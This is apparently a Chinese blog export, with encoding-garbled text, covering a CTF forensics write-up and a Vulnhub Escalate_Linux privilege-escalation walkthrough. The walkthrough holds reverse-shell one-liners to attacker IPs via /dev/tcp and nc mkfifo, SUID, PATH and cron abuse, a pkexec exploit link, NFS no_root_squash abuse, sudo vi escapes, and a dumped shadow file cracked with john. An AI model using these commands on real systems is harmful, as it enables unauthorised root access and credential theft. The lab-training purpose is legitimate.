<h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><h4 id="éšèº«æºå¸¦çš„è™šæ‹Ÿæœº"><a href="#éšèº«æºå¸¦çš„è™šæ‹Ÿæœº" class="headerlink" title="éšèº«æºå¸¦çš„è™šæ‹Ÿæœº"></a>éšèº«æºå¸¦çš„è™šæ‹Ÿæœº</h4><p>CHALLENGE: éšèº«æºå¸¦çš„è™šæ‹Ÿæœº<br>DESCRIPTION: å¯å¯æ²¡äº†è™šæ‹Ÿæœºå°±è·Ÿæ²¡äº†å‘½ä¼¼çš„ã€‚<br>åˆ«ç¬‘ï¼Œéƒ½çœŸäº‹ï¼Œæ¯æ¬¡æˆ‘åœ¨å¤§æ´»115è§åˆ°ä»–çš„æ—¶å€™ï¼Œä»–ç”µè„‘ä¸Šæ€»æ˜¯è¿ç€ä¸€å—ç§»åŠ¨ç¡¬ç›˜ï¼Œä»–å°±æŠŠè™šæ‹Ÿæœºå­˜é‚£ç›˜ä¸Šã€‚<br>â€œä¸æ˜¯ï¼ŒUSBçš„é€Ÿåº¦çœŸçš„å¤Ÿæ’‘å¾—èµ·è™šæ‹Ÿæœºå—ï¼Ÿâ€ä¸è¿‡è¿™æ˜¯åˆ«çš„è¯äº†ã€‚è¿˜æ˜¯çœ‹çœ‹è¿œå¤„çš„é›¶å…‰å§ï¼šä»–æŠŠè¿è¡Œä¸­çš„ç›˜æ‹”å»åšé•œåƒäº†ï¼Œç°åœ¨æ­£åœ¨è¢«å¯å¯åŠèµ·æ¥æ‰“ã€‚<br>é™„ä»¶é“¾æ¥ï¼š<a href="https://cowtransfer.com/s/a5520c2c45504e">https://cowtransfer.com/s/a5520c2c45504e</a></p>
<p>ç£ç›˜å–è¯</p>
<p>ä¸‹è½½ä¸‹æ¥å ç”¨VM fusion åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœº ç„¶ååŠ è½½ vmdkæ–‡ä»¶ æˆåŠŸæ‰“å¼€è™šæ‹Ÿæœº</p>
<p><img src="/posts/undefined/4.png" alt="img"></p>
<p>å›æ”¶ç«™æœ‰ä¸ªæ–‡ä»¶</p>
<p><img src="/posts/undefined/5.png" alt="img"></p>
<p><img src="/posts/undefined/6.png" alt="img"></p>
<p>ç£ç›˜åŠ å¯†æ¢å¤key</p>
<p>æ‰“å¼€ç£ç›˜å­˜åœ¨ä¸€ä¸ªåŠ å¯†çš„Dç›˜ å› ä¸ºä¸çŸ¥é“å¯†ç  æ‰€ä»¥ç›´æ¥é€‰æ‹© Recoverykeyè¾“å…¥åæˆåŠŸæ‰“å¼€</p>
<p><img src="/posts/undefined/7.png" alt="img"></p>
<p><img src="/posts/undefined/8.png" alt="img"></p>
<p>é‡Œé¢å¾—åˆ°flag.txt  base64å¾—åˆ°flag  moectf{Bas1c_D15k_F0r3ns1cs!}</p>
<h4 id="åšæŒè®¿é—®çš„æµè§ˆå™¨"><a href="#åšæŒè®¿é—®çš„æµè§ˆå™¨" class="headerlink" title="åšæŒè®¿é—®çš„æµè§ˆå™¨"></a>åšæŒè®¿é—®çš„æµè§ˆå™¨</h4><p>æ‰¾åˆ°Firefoxæµè§ˆè®°å½• é‡Œé¢åŒ…å«ä¸€ä¸ªç½‘ç«™åœ°å€ï¼Œèµ·åˆè¿™ä¸ªç«™å‡ºé¢˜äººæœåŠ¡å™¨åæ‰äº† æ— æ³•è®¿é—®</p>
<p>åç»­å¯è®¿é—®äº†   <a href="https://hymint.space/~koito/">https://hymint.space/~koito/</a> æŸ¥çœ‹æºä»£ç æ‰¾åˆ°flag</p>
<p><img src="/posts/undefined/9.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Escalate_Linux</title>
    <url>/posts/c474af54/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨æ—¥å¸¸æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œé€šå¸¸ä¼šå…ˆæ‹¿åˆ°webshellï¼Œå½“æ‹¿åˆ°çš„æƒé™è¿‡ä½æ—¶ï¼Œéœ€è¦æå‡æƒé™è¿‘ä¸€æ­¥æ¸—é€ã€‚æœ¬ç¯‡å°†ä»¥Vulnhubçš„<a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">Escalate_Linux</a>é¶åœºä¸ºä¾‹ï¼Œæ€»ç»“ä¸€ä¸‹linuxç¯å¢ƒä¸‹å¸¸è§çš„ææƒæ–¹æ³•ã€‚</p>
<h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><p>æ¢æµ‹å‘ç°ä¸»æœº </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscovert -r 192.168.80.1/24</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°é¶æœºIP 192.168.80.53 ï¼ˆç”±äºç½‘ç»œå˜åŠ¨ é¶æœºipåé¢ä¼šå˜åŒ–ï¼‰</p>
<p>ç«¯å£æ‰«æ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -Pn -sV 192.168.80.53</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:94930f0a253a4c92ff1f902734f63eb9" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/94930f0a253a4c92ff1f902734f63eb9.png" alt="æˆªå›¾"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sVC -p- 192.168.80.53</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:39e91f782fa7b4cb47a3bc998e536e37" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/39e91f782fa7b4cb47a3bc998e536e37.png" alt="æˆªå›¾"></p>
<p>å­˜åœ¨http webæœåŠ¡ã€139ã€445ã€smbã€nfs</p>
<p>å…ˆçœ‹ä¸‹httpæœåŠ¡</p>
<p>è®¿é—®ä¸ºApache é»˜è®¤é¡µé¢  dirsearch æ‰«ä¸‹ç›®å½•  </p>
<p><img src="/posts/c474af54/attachment:5faefc7f5a065601e96c0591c39093f8" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/5faefc7f5a065601e96c0591c39093f8.png" alt="æˆªå›¾"></p>
<p>å‘ç°å­˜åœ¨ shell.php  æ™®é€šç”¨æˆ·æƒé™</p>
<p><img src="/posts/c474af54/attachment:784f5ab67cc5fad33e9cf5229f5cba45" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/784f5ab67cc5fad33e9cf5229f5cba45.png" alt="æˆªå›¾"></p>
<p><img src="/posts/c474af54/attachment:320f2f6f2f837a9e3ed2d71aca89af52" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/320f2f6f2f837a9e3ed2d71aca89af52.png" alt="æˆªå›¾"></p>
<p><img src="/posts/c474af54/attachment:082ea51331a7f3fb0c5ad2da6da3e829" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/082ea51331a7f3fb0c5ad2da6da3e829.png" alt="æˆªå›¾"></p>
<h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>åˆ©ç”¨nc åå¼¹bash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.80.56/3344 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨burpsuite è¿›è¡Œurlç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%38%30%2e%37%33%2f%33%33%34%34%20%3e%26%31%27 </span><br></pre></td></tr></table></figure>

<p>åå¼¹å¾—åˆ°shell</p>
<p><img src="/posts/c474af54/attachment:f790198318d6609601f07e5740f24ca2" alt="æˆªå›¾">![file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/f790198318d6609601f07e5740f24ca2.png)</p>
<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><h4 id="0x00-LinEnumè„šæœ¬æšä¸¾"><a href="#0x00-LinEnumè„šæœ¬æšä¸¾" class="headerlink" title="0x00 LinEnumè„šæœ¬æšä¸¾"></a>0x00 LinEnumè„šæœ¬æšä¸¾</h4><p><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a></p>
<p><img src="/posts/c474af54/attachment:9aa3d1c884bddf01c9018fd19435ba30" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/9aa3d1c884bddf01c9018fd19435ba30.png" alt="æˆªå›¾"></p>
<h4 id="0x01-SUIDææƒ"><a href="#0x01-SUIDææƒ" class="headerlink" title="0x01 SUIDææƒ"></a>0x01 SUIDææƒ</h4><p><img src="/posts/c474af54/attachment:d6f26b099d84f99e220ab628f847a8e8" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/d6f26b099d84f99e220ab628f847a8e8.png" alt="æˆªå›¾"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:26b748ad262da271a6c711562135cfc3" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/26b748ad262da271a6c711562135cfc3.png" alt="æˆªå›¾"></p>
<p>user3ä¸‹ æ‰§è¡Œå¯ç›´æ¥å¾—åˆ°rootæƒé™</p>
<p><img src="/posts/c474af54/attachment:176f980f1664bc1f90c0aa7afb639c6a" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/176f980f1664bc1f90c0aa7afb639c6a.png" alt="æˆªå›¾"></p>
<p><img src="/posts/c474af54/attachment:d35b162929866a2a5bc12bf8d5fa9237" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/d35b162929866a2a5bc12bf8d5fa9237.png" alt="æˆªå›¾"></p>
<p>é™¤äº†shellä¹‹å¤– è¿˜å­˜åœ¨ä¸€ä¸ªrootæƒé™ä¸”å…·æœ‰å†™å…¥æƒé™çš„ .script.sh è„šæœ¬ åˆ©ç”¨è¯¥è„šæœ¬å°†bashå†™åˆ°tmpä¸‹å¹¶ç»™äºˆsæƒé™</p>
<p><img src="/posts/c474af54/attachment:daa3614e8e8848928186e9971a067ed8" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/daa3614e8e8848928186e9971a067ed8.png" alt="æˆªå›¾"></p>
<p>echo â€œcp /bin/bash /tmp/shâ€ &gt; .script.sh echo â€œchmod +s /tmp/shâ€ &gt; .script.sh</p>
<p><img src="/posts/c474af54/attachment:e7006cbfd204060997512aeb7aa744be" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e7006cbfd204060997512aeb7aa744be.png" alt="æˆªå›¾">    </p>
<p>./shell</p>
<p><img src="/posts/c474af54/attachment:31d18615d165604e35a7cebc4f344323" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/31d18615d165604e35a7cebc4f344323.png" alt="æˆªå›¾"></p>
<p>./sh -p</p>
<p><img src="/posts/c474af54/attachment:b1588e89ae861b651cf5a8be3909943c" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/b1588e89ae861b651cf5a8be3909943c.png" alt="æˆªå›¾"></p>
<h4 id="0x02-ç¯å¢ƒå˜é‡ææƒ"><a href="#0x02-ç¯å¢ƒå˜é‡ææƒ" class="headerlink" title="0x02 ç¯å¢ƒå˜é‡ææƒ"></a>0x02 ç¯å¢ƒå˜é‡ææƒ</h4><p>åœ¨user5ä¸‹ ä¹Ÿå­˜åœ¨s    æƒé™çš„ script æ–‡ä»¶</p>
<p>è¿è¡ŒååŠŸèƒ½ ç­‰åŒäº ls</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ls</span><br><span class="line">chmod 777 ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:3683702f1e958e4ae63d29ab57f2f702" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3683702f1e958e4ae63d29ab57f2f702.png" alt="æˆªå›¾"></p>
<p><img src="/posts/c474af54/attachment:76cb7fa7b526dde9a194c55ab52b7c01" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/76cb7fa7b526dde9a194c55ab52b7c01.png" alt="æˆªå›¾"></p>
<h4 id="0x03-Pkexecææƒ"><a href="#0x03-Pkexecææƒ" class="headerlink" title="0x03 Pkexecææƒ"></a>0x03 Pkexecææƒ</h4><p><a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py</a></p>
<p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
<p>å‰é¢å‘ç°æœ‰python3ç¯å¢ƒ ç›´æ¥å°è¯•python3çš„poc</p>
<p><img src="/posts/c474af54/attachment:e5bbbde063cb63ba9fb8daf9bae3fea3" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e5bbbde063cb63ba9fb8daf9bae3fea3.png" alt="æˆªå›¾"></p>
<p>ç”±äºä¹Ÿå­˜åœ¨gccç¯å¢ƒ  å¯ä»¥ä¸‹è½½cç‰ˆæœ¬ ç„¶åmakeç¼–è¯‘è¿è¡Œ</p>
<p><img src="/posts/c474af54/attachment:3dce7fca2f3771cc7eca0d6d2de137b3" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3dce7fca2f3771cc7eca0d6d2de137b3.png" alt="æˆªå›¾"></p>
<h4 id="0x04-Mysqlå¼±å£ä»¤ä¿¡æ¯æ³„éœ²"><a href="#0x04-Mysqlå¼±å£ä»¤ä¿¡æ¯æ³„éœ²" class="headerlink" title="0x04 Mysqlå¼±å£ä»¤ä¿¡æ¯æ³„éœ²"></a>0x04 Mysqlå¼±å£ä»¤ä¿¡æ¯æ³„éœ²</h4><p>æ ¹æ®linEnum æ‰¾åˆ°mysqlå¼±å£ä»¤  root/root</p>
<p><img src="/posts/c474af54/attachment:85454cede9f9ede13abcf5c46c06c18a" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/85454cede9f9ede13abcf5c46c06c18a.png" alt="æˆªå›¾"></p>
<p>å¾—åˆ°ä¸€ä¸ªè´¦å·å¯†ç   å‰é¢cat /etc/passwdæ—¶ å‘ç°å­˜åœ¨mysqlç”¨æˆ· </p>
<p>ä½¿ç”¨è¯¥ç”¨æˆ·å¯†ç  å¯ä»¥ç™»å½•</p>
<p>find / -user  mysql  æŸ¥çœ‹mysqlç”¨æˆ·ä¸‹æ‰€å±æ–‡ä»¶</p>
<p><img src="/posts/c474af54/attachment:4f86485d7a014236d4c0da8997dbfe66" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/4f86485d7a014236d4c0da8997dbfe66.png" alt="æˆªå›¾"></p>
<p>cat /etc/mysql/secret.cnf  å¾—åˆ°rootç”¨æˆ·çš„ç™»å½•å¯†ç  ã€ä½†æ˜¯è¯¥å¯†ç å¹¶æ— æ³•ç™»å½•åˆ°rootç”¨æˆ·ã€‘</p>
<p><img src="/posts/c474af54/attachment:fc515af20eda2b650b1fe5ad634d85d8" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/fc515af20eda2b650b1fe5ad634d85d8.png" alt="æˆªå›¾"></p>
<p>/var/mysql/.informations æ²¡æƒé™ éœ€è¦rootæƒé™æ‰å¯ä»¥</p>
<p>é€šè¿‡å‰é¢çš„pkexec çš„rootæƒé™æŸ¥çœ‹è¯¥æ–‡ä»¶ å¾—åˆ°user2~user8çš„ç™»å½•å¯†ç   user{i}@12345</p>
<p><img src="/posts/c474af54/attachment:786d81cf96178ab0df36bdf054416ee8" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/786d81cf96178ab0df36bdf054416ee8.png" alt="æˆªå›¾"></p>
<h4 id="0x05-Corntabææƒ"><a href="#0x05-Corntabææƒ" class="headerlink" title="0x05 Corntabææƒ"></a>0x05 Corntabææƒ</h4><p>cat /etc/crontab å‘ç°åœ¨user4ä¸‹å­˜åœ¨rootæƒé™çš„å®šæ—¶ä»»åŠ¡</p>
<p><img src="/posts/c474af54/attachment:582472a05e2291085421362b71769f72" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/582472a05e2291085421362b71769f72.png" alt="æˆªå›¾"></p>
<p>å…ˆåˆ‡æ¢åˆ°user4ç”¨æˆ·ä¸‹ </p>
<p><img src="/posts/c474af54/attachment:8826051f156c1a996ed0950c5e9ff665" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/8826051f156c1a996ed0950c5e9ff665.png" alt="æˆªå›¾"></p>
<p>autoscript.sh åœ¨user4ä¸‹å…·æœ‰å†™æƒé™ </p>
<p>ç”¨echo è¦†å†™è¿›å» åå¼¹nc shell</p>
<p>python -c â€˜import pty;pty.spawn(â€œ/bin/bashâ€)â€™   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.80.60/8899 0&gt;&amp;1&#x27;  </span><br></pre></td></tr></table></figure>

<p>ä¸­é—´æœ‰ â€˜  ä¸å¤ªå¥½å¤„ç†  åˆ©ç”¨ç®¡é“å¤„ç† mkfifo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;mkfifo /tmp/tmpipe;  nc 192.168.80.60 8899 0&lt;/tmp/tmpipe | /bin/bash &gt; /tmp/tmpipe 2&gt;&amp;1; rm /tmp/tmpipe&#x27; &gt; autoscript.sh</span><br><span class="line">./autoscript.sh</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:e583500b9bd49f8f17f6c5d8e6649d57" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e583500b9bd49f8f17f6c5d8e6649d57.png" alt="æˆªå›¾"></p>
<p>å¾—åˆ°user4ç”¨æˆ· ä½†æ˜¯æ˜¯rootæƒé™</p>
<p><img src="/posts/c474af54/attachment:83f91e6debac4dcc69df911bdc3c239f" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/83f91e6debac4dcc69df911bdc3c239f.png" alt="æˆªå›¾"></p>
<h4 id="0x06-NFSæŒ‚è½½ææƒã€æœªæˆåŠŸã€‘"><a href="#0x06-NFSæŒ‚è½½ææƒã€æœªæˆåŠŸã€‘" class="headerlink" title="0x06 NFSæŒ‚è½½ææƒã€æœªæˆåŠŸã€‘"></a>0x06 NFSæŒ‚è½½ææƒã€æœªæˆåŠŸã€‘</h4><p>å‰é¢nmapæ‰«ç«¯å£æ—¶å€™ å‘ç°æœ‰nfsæœåŠ¡</p>
<p>åˆ©ç”¨LinEnumæ”¶é›†ä¹Ÿæ‰¾åˆ°äº†nfsç›¸å…³ä¿¡æ¯</p>
<p>/home/user5ç›®å½•ä¸‹å¼€å¯äº† no_root_squash</p>
<p><img src="/posts/c474af54/attachment:6d355031cd6c43eb447e8213f0833a7d" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/6d355031cd6c43eb447e8213f0833a7d.png" alt="æˆªå›¾"></p>
<p>1.æŸ¥çœ‹NFSæœåŠ¡å™¨ä¸Šçš„å…±äº«ç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo showmount -e 192.168.80.56</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:a7b3a912ff51397434d18c082b133d54" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/a7b3a912ff51397434d18c082b133d54.png" alt="æˆªå›¾"></p>
<p>2.åˆ›å»ºæœ¬åœ°æŒ‚è½½ç›®å½• æŒ‚è½½å…±äº«ç›®å½•  åˆ©ç”¨æ”»å‡»æœºkaliæœ¬åœ°rootæƒé™åˆ›å»ºsuid shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /tmp/data</span><br><span class="line"></span><br><span class="line">sudo mount -t nfs 192.168.80.56:/home/user5  /tmp/data</span><br><span class="line"></span><br><span class="line">sudo cp /bin/sh  /tmp/data/shell</span><br><span class="line"></span><br><span class="line">sudo chmod u+s /tmp/data/shell</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¸ç®¡å°è¯•bash è¿˜æ˜¯sh éƒ½ä¼šæŠ¥é”™ libtinfo.soæ–‡ä»¶ç¼ºå¤±</p>
<p>(åœ¨ubuntu18ä¸‹ ç»å¸¸ä¼šå‡ºç°è¯¥é—®é¢˜ åœ¨ubuntu20ä¸‹åˆ™ä¸ä¼šæœ‰  ç”±äºé¶æœºæ˜¯ubuntuç‰ˆæœ¬æ‰€ä»¥ä¼šæŠ¥é”™ç¼ºå¤±soæ–‡ä»¶)</p>
<p><img src="/posts/c474af54/attachment:9e2d8c564912663dcc3a3e4ee181e751" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/9e2d8c564912663dcc3a3e4ee181e751.png" alt="æˆªå›¾"></p>
<h4 id="0x07-john-çˆ†ç ´å¯†ç "><a href="#0x07-john-çˆ†ç ´å¯†ç " class="headerlink" title="0x07 john çˆ†ç ´å¯†ç "></a>0x07 john çˆ†ç ´å¯†ç </h4><p>é€šè¿‡å‰é¢ææƒæ–¹å¼  cat /etc/shadow</p>
<p>è·å–ç›¸å…³ç”¨æˆ·shadowä¿¡æ¯ å‰é¢é€šè¿‡æ•°æ®åº“å·²å¾—åˆ°äº†user1-8çš„å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</span><br><span class="line">user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::</span><br><span class="line">user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::</span><br><span class="line">user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::</span><br><span class="line">user4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::</span><br><span class="line">user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::</span><br><span class="line">user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::</span><br><span class="line">mysql:$6$O2ymBAYF$NZDtY392guzYrveKnoISea6oQpv87OpEjEef5KkEUqvtOAjZ2i1UPbkrfmrHG/IonKdnYEec0S0ZBcQFZ.sno/:18053:0:99999:7:::</span><br><span class="line">user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::</span><br><span class="line">user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>john shadow.txt</p>
<p>å¾—åˆ°rootç”¨æˆ·å¯†ç ä¸º 12345</p>
<p><img src="/posts/c474af54/attachment:3e5c34d015669144524e073997b6290b" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3e5c34d015669144524e073997b6290b.png" alt="æˆªå›¾"></p>
<p>æˆåŠŸç™»å½•åˆ°rootç”¨æˆ·</p>
<p><img src="/posts/c474af54/attachment:1ac6b364e251fd2be2a7d968e082c14c" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/1ac6b364e251fd2be2a7d968e082c14c.png" alt="æˆªå›¾"></p>
<h4 id="0x08-sudoææƒ1-â€”-vi-ææƒ"><a href="#0x08-sudoææƒ1-â€”-vi-ææƒ" class="headerlink" title="0x08  sudoææƒ1 â€” vi ææƒ"></a>0x08  sudoææƒ1 â€” vi ææƒ</h4><p>ç™»å½•user8  sudo -l </p>
<p><img src="/posts/c474af54/attachment:10cc90cd82f2e5d2c0ede1393eba99c5" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/10cc90cd82f2e5d2c0ede1393eba99c5.png" alt="æˆªå›¾"></p>
<p>vi ææƒ  å‚è€ƒ <a href="https://gtfobins.github.io/gtfobins/vi/">https://gtfobins.github.io/gtfobins/vi/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi </span><br><span class="line">:!sh </span><br><span class="line">æˆ–è€…</span><br><span class="line">sudo vi</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:47c0ea209eb2ab89e9e8f050dbe3c484" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/47c0ea209eb2ab89e9e8f050dbe3c484.png" alt="æˆªå›¾"></p>
<p><img src="/posts/c474af54/attachment:0ee35a1a8389a3f7be0d119570066355" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/0ee35a1a8389a3f7be0d119570066355.png" alt="æˆªå›¾"></p>
<h4 id="0x09-sudoææƒ-2"><a href="#0x09-sudoææƒ-2" class="headerlink" title="0x09 sudoææƒ 2"></a>0x09 sudoææƒ 2</h4><p>ç™»å½•åˆ°user2 </p>
<p>sudo -l </p>
<p><img src="/posts/c474af54/attachment:ed45f5c91b693f398b9d78415e9f6137" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/ed45f5c91b693f398b9d78415e9f6137.png" alt="æˆªå›¾"></p>
<p>user2ä¸‹æ‰€ä»¥  user1å‡å…·æœ‰æƒé™</p>
<p>ç™»å½•åˆ°user1 sudo -l</p>
<p><img src="/posts/c474af54/attachment:a814e593c544373206b840a1bcec7950" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/a814e593c544373206b840a1bcec7950.png" alt="æˆªå›¾"></p>
<p>user1 å…·æœ‰æ‰€æœ‰æƒé™   å¯ç›´æ¥su ç™»å½•root</p>
